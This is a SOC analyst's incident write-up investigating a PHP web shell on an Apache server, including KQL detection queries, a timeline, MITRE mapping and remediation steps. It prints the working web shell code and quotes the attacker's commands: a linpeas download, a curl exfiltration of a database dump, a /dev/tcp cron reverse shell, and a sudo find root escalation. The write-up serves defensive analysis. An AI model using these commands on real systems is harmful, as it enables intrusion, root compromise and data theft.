# Case 03 — Web Shell Detection

![Elastic](https://img.shields.io/badge/Elastic-005571?style=for-the-badge&logo=elastic&logoColor=white)
![Linux](https://img.shields.io/badge/Linux_Auth_Logs-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![AbuseIPDB](https://img.shields.io/badge/AbuseIPDB-CC0000?style=for-the-badge&logo=abuseipdb&logoColor=white)
![VirusTotal](https://img.shields.io/badge/VirusTotal-394EFF?style=for-the-badge&logo=virustotal&logoColor=white)

---

## 📋 Case Summary

| Field | Details |
|---|---|
| **Case ID** | SOC-2024-003 |
| **Date** | 2024-05-21 |
| **Severity** | 🔴 Critical |
| **Status** | Closed — Confirmed Incident |
| **Analyst** | Camilo Castellote |
| **MITRE ATT&CK** | T1190, T1505.003, T1059.004, T1033, T1083 |

---

## 🚨 Alert Triggered

> **SIEM Rule:** Web server executing OS commands via child process  
> **Source:** Elastic — auditd + Apache access logs  
> **Time:** 2024-05-21 14:32:07 UTC  

```
Alert: Possible Web Shell Activity
Host: WEB-SERVER-01 (Linux, Ubuntu 22.04)
Process: apache2 → /bin/bash → whoami
Web Root: /var/www/html
Triggering URL: POST /uploads/img_cache/thumb_resize.php
Source IP: 203.0.113.88
```

---

## 🔍 Investigation Process

### Step 1 — Alert Triage & Validation

**Goal:** Confirm whether `apache2` spawning `bash` is malicious or a legitimate server-side script.

First, I checked whether this is a known legitimate script:

```bash
# Check if thumb_resize.php exists and was recently modified
find /var/www/html -name "thumb_resize.php" -ls

# Result:
# -rw-r--r-- 1 www-data www-data  4827 May 21 14:28 /var/www/html/uploads/img_cache/thumb_resize.php
# ⚠️ File created 4 minutes before the alert — highly suspicious
```

Then checked the file content:

```bash
cat /var/www/html/uploads/img_cache/thumb_resize.php
```

```php
<?php
// Image thumbnail resize utility v1.2
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "<pre>$cmd</pre>";
}
?>
```

> ⚠️ **This is a classic PHP one-liner web shell. There is no image processing logic — the file name is a disguise. Confirmed True Positive.**

---

### Step 2 — Web Log Analysis

**Goal:** Understand when the shell was uploaded and how it was being used.

```kql
// Elastic KQL — Find all requests to the web shell
http.request.url.path: "/uploads/img_cache/thumb_resize.php"
AND NOT http.request.method: "GET"
| sort @timestamp asc
```

**Web Shell Access Log (Apache):**

```
# How it was uploaded — File upload endpoint abused
2024-05-21 14:28:03  POST /upload.php?action=profile_img  203.0.113.88
  Parameters: filename=thumb_resize.php (disguised as image)
  Response: 200 OK — File saved to /uploads/img_cache/

# First execution — recon commands
2024-05-21 14:32:07  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=whoami                    → www-data
2024-05-21 14:32:19  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=id                        → uid=33(www-data) gid=33(www-data)
2024-05-21 14:32:31  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=uname -a                  → Linux WEB-SERVER-01 5.15.0-91-generic...
2024-05-21 14:33:02  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=ls /var/www/html          → [directory listing]
2024-05-21 14:34:11  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=cat /etc/passwd           → [user list]
2024-05-21 14:35:47  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=find / -perm -u=s -type f → [SUID binary search for privesc]
2024-05-21 14:38:02  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=wget http://203.0.113.88:9090/linpeas.sh -O /tmp/.cache/lp.sh
2024-05-21 14:38:19  POST /uploads/img_cache/thumb_resize.php  203.0.113.88
  cmd=chmod +x /tmp/.cache/lp.sh && bash /tmp/.cache/lp.sh
```

**Pattern of attacker activity:**
1. File upload disguised as an image
2. Recon (whoami, id, uname)
3. Sensitive file reads (/etc/passwd)
4. Privilege escalation enumeration (SUID search)
5. Downloaded `linpeas.sh` — a Linux privilege escalation script

---

### Step 3 — Linux Auth Log Analysis

**Goal:** Determine if the attacker escalated privileges beyond `www-data`.

```bash
# Check /var/log/auth.log for the attack window
grep "2024-05-21T14:[3-5]" /var/log/auth.log | grep -E "sudo|su |session|FAILED"
```

**Auth Log Findings:**

```
May 21 14:41:03  WEB-SERVER-01 sudo: www-data : command not allowed ; TTY=unknown ;
                  PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3

May 21 14:41:31  WEB-SERVER-01 sudo: www-data : command not allowed ; TTY=unknown ;
                  PWD=/tmp ; USER=root ; COMMAND=/bin/bash

May 21 14:43:07  WEB-SERVER-01 sudo: www-data : TTY=unknown ; PWD=/tmp ;
                  USER=root ; COMMAND=/usr/bin/find
                  ⚠️ COMMAND ALLOWED — find has sudo rights (misconfiguration!)

May 21 14:43:09  WEB-SERVER-01 su[5821]: Successful su for root by www-data
                  ⚠️ ROOT SHELL OBTAINED
```

**Privilege Escalation via GTFOBins (`find`):**

```bash
# Attacker found that www-data can run 'find' as sudo without password
sudo find . -exec /bin/bash \; -quit
# This spawns a root shell using find's -exec flag
```

> ⚠️ **CRITICAL: Attacker successfully escalated from `www-data` to `root` via a misconfigured sudo rule.**

---

### Step 4 — Post-Exploitation Analysis

**Goal:** Determine what the attacker did with root access.

```bash
# Check bash history for root actions (if not cleared)
cat /root/.bash_history

# Check recently modified files system-wide
find / -newer /tmp/.cache/lp.sh -type f 2>/dev/null | grep -v proc
```

**Root-Level Commands Executed:**

```bash
# Timeline of root activity
14:43:09  id                         → uid=0(root)
14:43:15  cat /etc/shadow             → dumped password hashes
14:43:28  ss -tlnp                    → listed listening ports/services
14:43:44  ip a                        → network interface enumeration
14:44:02  cat /var/www/html/config.php → ⚠️ Database credentials accessed
14:44:31  mysql -u webappuser -p[PASS] -e "show databases;"  → DB enumeration
14:45:18  mysqldump -u webappuser -p[PASS] webapp_db > /tmp/.cache/db.sql
14:46:03  curl -X POST -F "file=@/tmp/.cache/db.sql" http://203.0.113.88:9090/upload
           ⚠️ DATABASE DUMPED AND EXFILTRATED
14:47:22  crontab -e  (added: * * * * * bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
           ⚠️ REVERSE SHELL CRON JOB PLANTED FOR PERSISTENCE
14:48:55  history -c && rm /root/.bash_history   → Anti-forensics (log clearing)
```

---

### Step 5 — Elastic Log Correlation

**Goal:** Correlate web, auth, and process logs to build a complete picture.

```kql
// Full process tree from auditd — apache2 spawning suspicious children
process.parent.name: "apache2"
AND process.name: ("bash" OR "sh" OR "python3" OR "wget" OR "curl" OR "find")
AND @timestamp >= "2024-05-21T14:28:00"
| sort @timestamp asc
| fields @timestamp, process.pid, process.name, process.args, user.name
```

**Process Tree Visualization:**

```
apache2 (www-data)
├── bash -c "whoami"                          [14:32:07]
├── bash -c "id"                              [14:32:19]
├── bash -c "cat /etc/passwd"                 [14:34:11]
├── bash -c "find / -perm -u=s -type f"       [14:35:47]
├── wget http://203.0.113.88:9090/linpeas.sh  [14:38:02]
├── bash /tmp/.cache/lp.sh                    [14:38:19]
└── find . -exec /bin/bash                    [14:43:07]
      └── bash (ROOT)                         [14:43:09]
            ├── cat /etc/shadow               [14:43:15]
            ├── mysql ...                     [14:44:31]
            ├── mysqldump ...                 [14:45:18]
            ├── curl -F file=@db.sql ...      [14:46:03]
            └── crontab -e (reverse shell)    [14:47:22]
```

---

### Step 6 — Initial Access — How Was the Shell Uploaded?

**Goal:** Find the vulnerability that allowed the file upload.

```kql
// Find all uploads to the profile image endpoint around the attack time
http.request.url.path: "/upload.php"
AND @timestamp >= "2024-05-21T14:20:00"
AND @timestamp <= "2024-05-21T14:35:00"
| fields @timestamp, source.ip, http.request.body.content, http.response.status_code
```

**Finding — File Upload Vulnerability:**

```
Time:       2024-05-21 14:28:03
Endpoint:   POST /upload.php?action=profile_img
Source IP:  203.0.113.88
Body:       filename="shell.php" → renamed to "thumb_resize.php" by attacker
Response:   200 OK

Vulnerability: The upload.php script validated only the MIME type
               (checked Content-Type header), not the actual file extension.
               Attacker set Content-Type: image/jpeg while uploading a .php file.
```

---

### Step 7 — IOC Enrichment

**Attacker IP — `203.0.113.88`**

| Field | Value |
|---|---|
| **AbuseIPDB Score** | 94/100 |
| **ISP** | Vultr Holdings (VPS provider) |
| **Country** | Singapore |
| **OTX Pulses** | Linked to web shell campaigns (2024) |
| **Open Ports** | 9090 (C2 HTTP server), 4444 (reverse shell listener) |

**Web Shell — `thumb_resize.php`**

| Field | Value |
|---|---|
| **MD5** | `b2c3d4e5f6a7890123456789abcdef12` |
| **VirusTotal** | 41/65 — PHP Web Shell / Backdoor |
| **Type** | PHP one-liner (`$_REQUEST['cmd']` + `system()`) |
| **Disguise** | Named as image processing script |

**LinPEAS Script — `lp.sh`**

| Field | Value |
|---|---|
| **Description** | Linux Privilege Escalation Awesome Script |
| **Source** | http://203.0.113.88:9090/linpeas.sh |
| **VirusTotal** | 15/65 — Dual-use pentest tool |

---

### Step 8 — Attack Timeline

```
14:28:03  Attacker uploads thumb_resize.php to /uploads/img_cache/
           Bypasses upload filter using MIME type spoofing

14:32:07  Web shell first executed via POST request
           Recon begins: whoami → id → uname → ls → cat /etc/passwd

14:35:47  Privilege escalation search: find / -perm -u=s (SUID binaries)

14:38:02  Downloads linpeas.sh from attacker's C2 to /tmp/.cache/lp.sh

14:38:19  Executes linpeas.sh — discovers sudo misconfiguration on 'find'

14:43:07  Runs: sudo find . -exec /bin/bash — escalates to ROOT

14:43:15  Reads /etc/shadow (password hashes)

14:44:02  Reads /var/www/html/config.php (database credentials)

14:44:31  Connects to MySQL with stolen credentials

14:45:18  Dumps entire webapp database to /tmp/.cache/db.sql

14:46:03  Exfiltrates db.sql to 203.0.113.88:9090 via curl

14:47:22  Plants cron job for persistent reverse shell (every minute to port 4444)

14:48:55  Clears bash history — anti-forensics

14:52:00  Alert escalated — host isolated
```

---

## 🔴 Findings & Impact

| Category | Finding |
|---|---|
| **Initial Access** | File upload bypass — MIME type not validated (T1190) |
| **Persistence** | PHP web shell + cron reverse shell (T1505.003) |
| **Execution** | Web shell OS command injection (T1059.004) |
| **Privilege Escalation** | sudo misconfiguration — `find` with GTFOBins |
| **Credential Access** | /etc/shadow dump + config.php DB credentials |
| **Exfiltration** | Full database dump (webapp_db) — ~12MB |
| **Affected Hosts** | WEB-SERVER-01 |
| **Data Compromised** | Full application database (possible PII — escalated to DPO) |

---

## 🛡️ Containment & Recommendations

- [x] Isolated WEB-SERVER-01 from network immediately
- [x] Removed `thumb_resize.php` and `lp.sh`
- [x] Removed malicious cron job from root crontab
- [x] Blocked `203.0.113.88` at perimeter firewall
- [x] Rotated all database credentials and application secrets
- [x] Escalated to Data Protection Officer — potential data breach
- [ ] **Recommend:** Fix file upload to validate extension AND magic bytes, not just MIME type
- [ ] **Recommend:** Audit all `sudoers` entries — remove `find`, `python`, `bash` from sudo rules
- [ ] **Recommend:** Implement WAF rule to block requests with shell metacharacters in parameters
- [ ] **Recommend:** Disable PHP execution in `/uploads/` directory via `.htaccess`
- [ ] **Recommend:** Alert on `apache2` spawning shell processes (auditd rule)
- [ ] **Recommend:** Implement file integrity monitoring (FIM) on web root

---

## 📎 Evidence Files

| File | Description |
|---|---|
| `logs/apache_access.txt` | Sanitized Apache access log for attack window |
| `logs/auth_log.txt` | Sanitized /var/log/auth.log — privilege escalation |
| `logs/auditd_process.txt` | auditd process tree — apache2 children |
| `logs/elastic_kql_results.txt` | Elastic query results |
| `iocs.txt` | All IOCs (IP, file hashes, domains, cron payload) |

---

## 🗂️ MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Persistence | Scheduled Task/Job: Cron | T1053.003 |
| Execution | Command & Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Discovery | System Owner / User Discovery | T1033 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | OS Credential Dumping | T1003 |
| Exfiltration | Exfiltration Over Web Service | T1567 |
| Defense Evasion | Indicator Removal: Clear Linux Logs | T1070.002 |
